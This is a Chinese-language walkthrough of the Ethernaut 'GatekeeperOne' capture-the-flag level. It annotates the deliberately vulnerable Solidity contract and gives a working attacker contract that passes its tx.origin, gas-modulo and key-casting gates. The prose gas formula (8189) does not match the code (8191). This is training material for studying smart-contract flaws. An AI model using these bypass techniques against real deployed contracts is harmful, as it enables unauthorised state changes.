# Ethernaut 13-GatekeeperOne

## 本关目标

- 成为 entrant

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  // 目标成为entrant
  address public entrant;

  modifier gateOne() {
    // msg.sender要和tx.orign不同
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    // 剩余的gas要能被8191整除
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      // 传入的值要满足一定的条件
      // 32位的key要和16位的相同
      // 32位的key和64位的不同
      // 32位的key要和tx.orign的16位相同
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  // 需要破解gateOne、gateTwo、gateThree修改entrant
  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## 解决方案

1. 破解 gateOne， 只需要构造一个 Hack 合约，使用 Hack 合约调用 enter()
2. 破解 gateTwo， 需要测试调用 enter 需要消耗的 gas x，例如设置交易总 gas 为 x+8189 \* 3 即可（本关 x=256）
3. 破解 gateThree， 根据 tx.orign 的 16 位构造\_gateKey 的低 32 位，然后高位设置不同即可

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

contract HackOne{

    GatekeeperOne  private immutable gateKeeperOne;

    constructor(address _target) {
        gateKeeperOne = GatekeeperOne (_target);
    }

    // 本关传入gas=256
    function hack(uint256 gas) external {
        bytes8 gateKey;
        // 构造_gaseKey
        gateKey = bytes8(uint64(1<<63) + uint64(uint16(uint160(tx.origin))));

        // 调用enter
        require(gateKeeperOne.enter{gas: 8191 * 3 + gas}(gateKey), "failed!");
    }
}
```
